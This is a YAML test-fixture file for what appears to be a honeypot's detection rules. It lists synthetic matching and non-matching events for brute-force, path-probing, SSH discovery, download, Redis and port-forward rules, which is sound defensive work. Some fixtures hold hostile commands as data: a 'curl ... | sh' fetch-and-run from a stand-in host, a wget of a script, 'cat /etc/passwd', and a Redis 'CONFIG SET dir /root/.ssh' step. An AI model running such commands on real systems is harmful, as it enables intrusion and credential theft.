@@ -1,0 +1,273 @@
+# Hiten | 2026
+# cases.yaml
+#
+# Synthetic rule tests. These events are built in memory by
+# internal/detection/cases_test.go; they are not captured traffic.
+# Every enabled rule must list at least one positive and one negative
+# case here, and the test fails if a named case is missing.
+#
+# at: offset from a fixed start time. session defaults to "s1",
+# source to 203.0.113.10 and sensor to hive-01.
+
+cases:
+  # HLAB-AUTH-001
+  - name: auth-volume-five-in-window
+    rule: HLAB-AUTH-001
+    expect: match
+    evidence: 5
+    events:
+      - {at: 0s,  service: ssh, type: login.success, data: {username: root, password: a, auth_mode: accept-all}}
+      - {at: 30s, service: ssh, type: login.success, data: {username: root, password: b, auth_mode: accept-all}}
+      - {at: 60s, service: ssh, type: login.success, data: {username: root, password: c, auth_mode: accept-all}}
+      - {at: 90s, service: ssh, type: login.success, data: {username: root, password: d, auth_mode: accept-all}}
+      - {at: 120s, service: ssh, type: login.success, data: {username: root, password: e, auth_mode: accept-all}}
+  - name: auth-volume-mixed-results
+    rule: HLAB-AUTH-001
+    expect: match
+    events:
+      - {at: 0s,  service: ftp, type: login.failed, data: {username: a}}
+      - {at: 10s, service: ftp, type: login.failed, data: {username: a}}
+      - {at: 20s, service: ftp, type: login.success, data: {username: a}}
+      - {at: 30s, service: ftp, type: login.failed, data: {username: a}}
+      - {at: 40s, service: ftp, type: login.success, data: {username: a}}
+  - name: auth-volume-outside-window
+    rule: HLAB-AUTH-001
+    expect: no_match
+    events:
+      - {at: 0s,   service: ssh, type: login.success, data: {username: root}}
+      - {at: 100s, service: ssh, type: login.success, data: {username: root}}
+      - {at: 200s, service: ssh, type: login.success, data: {username: root}}
+      - {at: 300s, service: ssh, type: login.success, data: {username: root}}
+      - {at: 400s, service: ssh, type: login.success, data: {username: root}}
+      - {at: 500s, service: ssh, type: login.success, data: {username: root}}
+  - name: auth-volume-split-services
+    rule: HLAB-AUTH-001
+    expect: no_match
+    events:
+      - {at: 0s,  service: ssh, type: login.success, data: {username: root}}
+      - {at: 5s,  service: ssh, type: login.success, data: {username: root}}
+      - {at: 10s, service: ftp, type: login.success, data: {username: root}}
+      - {at: 15s, service: ftp, type: login.success, data: {username: root}}
+      - {at: 20s, service: mysql, type: login.success, data: {username: root}}
+
+  # HLAB-AUTH-002
+  - name: failure-burst-five
+    rule: HLAB-AUTH-002
+    expect: match
+    evidence: 5
+    events:
+      - {at: 0s,  service: ssh, type: login.failed, data: {username: root, auth_mode: test-credentials}}
+      - {at: 5s,  service: ssh, type: login.failed, data: {username: admin, auth_mode: test-credentials}}
+      - {at: 10s, service: ssh, type: login.failed, data: {username: root, auth_mode: test-credentials}}
+      - {at: 15s, service: ssh, type: login.failed, data: {username: user, auth_mode: test-credentials}}
+      - {at: 20s, service: ssh, type: login.failed, data: {username: root, auth_mode: test-credentials}}
+  - name: failure-burst-successes-only
+    rule: HLAB-AUTH-002
+    expect: no_match
+    events:
+      - {at: 0s,  service: ssh, type: login.success, data: {username: root}}
+      - {at: 5s,  service: ssh, type: login.success, data: {username: root}}
+      - {at: 10s, service: ssh, type: login.success, data: {username: root}}
+      - {at: 15s, service: ssh, type: login.success, data: {username: root}}
+      - {at: 20s, service: ssh, type: login.success, data: {username: root}}
+      - {at: 25s, service: ssh, type: login.success, data: {username: root}}
+  - name: failure-burst-four
+    rule: HLAB-AUTH-002
+    expect: no_match
+    events:
+      - {at: 0s,  service: ssh, type: login.failed, data: {username: root}}
+      - {at: 5s,  service: ssh, type: login.failed, data: {username: root}}
+      - {at: 10s, service: ssh, type: login.failed, data: {username: root}}
+      - {at: 15s, service: ssh, type: login.failed, data: {username: root}}
+
+  # HLAB-AUTH-003
+  - name: fts-three-failures-then-success
+    rule: HLAB-AUTH-003
+    expect: match
+    evidence: 4
+    events:
+      - {at: 0s,  service: ssh, type: login.failed,  data: {username: labuser}}
+      - {at: 10s, service: ssh, type: login.failed,  data: {username: labuser}}
+      - {at: 20s, service: ssh, type: login.failed,  data: {username: labuser}}
+      - {at: 30s, service: ssh, type: login.success, data: {username: labuser}}
+  - name: fts-different-account
+    rule: HLAB-AUTH-003
+    expect: no_match
+    events:
+      - {at: 0s,  service: ssh, type: login.failed,  data: {username: root}}
+      - {at: 10s, service: ssh, type: login.failed,  data: {username: root}}
+      - {at: 20s, service: ssh, type: login.failed,  data: {username: root}}
+      - {at: 30s, service: ssh, type: login.success, data: {username: labuser}}
+  - name: fts-expired-window
+    rule: HLAB-AUTH-003
+    expect: no_match
+    events:
+      - {at: 0s,   service: ssh, type: login.failed,  data: {username: labuser}}
+      - {at: 10s,  service: ssh, type: login.failed,  data: {username: labuser}}
+      - {at: 20s,  service: ssh, type: login.failed,  data: {username: labuser}}
+      - {at: 400s, service: ssh, type: login.success, data: {username: labuser}}
+  - name: fts-success-first
+    rule: HLAB-AUTH-003
+    expect: no_match
+    events:
+      - {at: 0s,  service: ssh, type: login.success, data: {username: labuser}}
+      - {at: 10s, service: ssh, type: login.failed,  data: {username: labuser}}
+      - {at: 20s, service: ssh, type: login.failed,  data: {username: labuser}}
+      - {at: 30s, service: ssh, type: login.failed,  data: {username: labuser}}
+
+  # HLAB-HTTP-001
+  - name: http-three-sensitive-paths
+    rule: HLAB-HTTP-001
+    expect: match
+    evidence: 3
+    events:
+      - {at: 0s,  service: http, type: request, data: {method: GET, path: /.env}}
+      - {at: 5s,  service: http, type: request, data: {method: GET, path: /.git/config}}
+      - {at: 10s, service: http, type: request, data: {method: GET, path: /phpMyAdmin/index.php}}
+  - name: http-ordinary-browsing
+    rule: HLAB-HTTP-001
+    expect: no_match
+    events:
+      - {at: 0s, service: http, type: request, data: {method: GET, path: /}}
+      - {at: 2s, service: http, type: request, data: {method: GET, path: /robots.txt}}
+      - {at: 4s, service: http, type: request, data: {method: GET, path: /about}}
+      - {at: 6s, service: http, type: request, data: {method: GET, path: /favicon.ico}}
+      - {at: 8s, service: http, type: request, data: {method: GET, path: /environment}}
+  - name: http-same-path-repeated
+    rule: HLAB-HTTP-001
+    expect: no_match
+    events:
+      - {at: 0s, service: http, type: request, data: {method: GET, path: /wp-login.php}}
+      - {at: 5s, service: http, type: request, data: {method: POST, path: /wp-login.php}}
+      - {at: 9s, service: http, type: request, data: {method: POST, path: /wp-login.php}}
+  - name: http-paths-outside-window
+    rule: HLAB-HTTP-001
+    expect: no_match
+    events:
+      - {at: 0s,   service: http, type: request, data: {method: GET, path: /.env}}
+      - {at: 70s,  service: http, type: request, data: {method: GET, path: /.git/config}}
+      - {at: 140s, service: http, type: request, data: {method: GET, path: /wp-config.php}}
+
+  # HLAB-NET-001
+  - name: multi-service-three
+    rule: HLAB-NET-001
+    expect: match
+    evidence: 3
+    events:
+      - {at: 0s,  service: ssh,   type: connect, session: a}
+      - {at: 5s,  service: http,  type: request, session: b, data: {path: /}}
+      - {at: 10s, service: mysql, type: connect, session: c}
+  - name: multi-service-one-repeated
+    rule: HLAB-NET-001
+    expect: no_match
+    events:
+      - {at: 0s,  service: ssh, type: connect, session: a}
+      - {at: 5s,  service: ssh, type: connect, session: b}
+      - {at: 10s, service: ssh, type: connect, session: c}
+      - {at: 15s, service: ssh, type: connect, session: d}
+  - name: multi-service-outside-window
+    rule: HLAB-NET-001
+    expect: no_match
+    events:
+      - {at: 0s,   service: ssh,   type: connect, session: a}
+      - {at: 45s,  service: ftp,   type: connect, session: b}
+      - {at: 110s, service: redis, type: connect, session: c}
+
+  # HLAB-SSH-001
+  - name: discovery-three-distinct
+    rule: HLAB-SSH-001
+    expect: match
+    evidence: 3
+    events:
+      - {at: 0s,  service: ssh, type: command.input, data: {command: whoami}}
+      - {at: 5s,  service: ssh, type: command.input, data: {command: uname -a}}
+      - {at: 10s, service: ssh, type: command.input, data: {command: cat /etc/passwd}}
+  - name: discovery-in-one-line
+    rule: HLAB-SSH-001
+    expect: match
+    evidence: 1
+    events:
+      - {at: 0s, service: ssh, type: command.input, data: {command: "id; uname -a && ifconfig"}}
+  - name: discovery-single-command
+    rule: HLAB-SSH-001
+    expect: no_match
+    events:
+      - {at: 0s, service: ssh, type: command.input, data: {command: uname -a}}
+      - {at: 5s, service: ssh, type: command.input, data: {command: uname -r}}
+      - {at: 9s, service: ssh, type: command.input, data: {command: ls -la}}
+  - name: discovery-mentions-only
+    rule: HLAB-SSH-001
+    expect: no_match
+    events:
+      - {at: 0s, service: ssh, type: command.input, data: {command: "echo whoami uname id"}}
+      - {at: 5s, service: ssh, type: command.input, data: {command: "grep hostname notes.txt"}}
+      - {at: 9s, service: ssh, type: command.input, data: {command: "cat ideas.txt"}}
+  - name: discovery-other-session
+    rule: HLAB-SSH-001
+    expect: no_match
+    events:
+      - {at: 0s,  service: ssh, type: command.input, session: s1, data: {command: whoami}}
+      - {at: 5s,  service: ssh, type: command.input, session: s2, data: {command: uname -a}}
+      - {at: 10s, service: ssh, type: command.input, session: s3, data: {command: id}}
+
+  # HLAB-SSH-002
+  - name: transfer-wget-url
+    rule: HLAB-SSH-002
+    expect: match
+    evidence: 1
+    events:
+      - {at: 0s, service: ssh, type: command.input, data: {command: "wget http://malware.example.test/x.sh"}}
+  - name: transfer-curl-in-pipeline
+    rule: HLAB-SSH-002
+    expect: match
+    events:
+      - {at: 0s, service: ssh, type: command.input, data: {command: "cd /tmp; curl -fsSL example.test/i.sh | sh"}}
+  - name: transfer-echo-mentions-curl
+    rule: HLAB-SSH-002
+    expect: no_match
+    events:
+      - {at: 0s, service: ssh, type: command.input, data: {command: "echo curl http://example.test/x"}}
+      - {at: 5s, service: ssh, type: command.input, data: {command: "cat curl-notes.txt"}}
+  - name: transfer-curl-no-target
+    rule: HLAB-SSH-002
+    expect: no_match
+    events:
+      - {at: 0s, service: ssh, type: command.input, data: {command: "curl --version"}}
+      - {at: 5s, service: ftp, type: command.input, data: {command: "RETR", arg: "http://example.test/x"}}
+
+  # HLAB-REDIS-001
+  - name: redis-config-set
+    rule: HLAB-REDIS-001
+    expect: match
+    events:
+      - {at: 0s, service: redis, type: exploit.attempt, data: {command: CONFIG SET, raw: "CONFIG SET dir /root/.ssh"}}
+  - name: redis-get-command
+    rule: HLAB-REDIS-001
+    expect: no_match
+    events:
+      - {at: 0s, service: redis, type: command.input, data: {command: GET, raw: "GET config"}}
+
+  # HLAB-SSH-003
+  - name: port-forward-request
+    rule: HLAB-SSH-003
+    expect: match
+    events:
+      - {at: 0s, service: ssh, type: exploit.attempt, data: {channel_type: direct-tcpip, target: "10.0.0.5:3389"}}
+  - name: port-forward-session-channel
+    rule: HLAB-SSH-003
+    expect: no_match
+    events:
+      - {at: 0s, service: ssh, type: login.success, data: {username: root}}
+      - {at: 1s, service: ssh, type: command.input, data: {command: "ssh -L 8080:localhost:80 host"}}
+
+  # HLAB-HTTP-002
+  - name: scanner-ua-nikto
+    rule: HLAB-HTTP-002
+    expect: match
+    events:
+      - {at: 0s, service: http, type: scan.detected, data: {scanner: nikto, user_agent: "Mozilla/5.00 (Nikto/2.1.6)", path: /}}
+  - name: scanner-ua-browser
+    rule: HLAB-HTTP-002
+    expect: no_match
+    events:
+      - {at: 0s, service: http, type: request, data: {path: /, user_agent: "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"}}
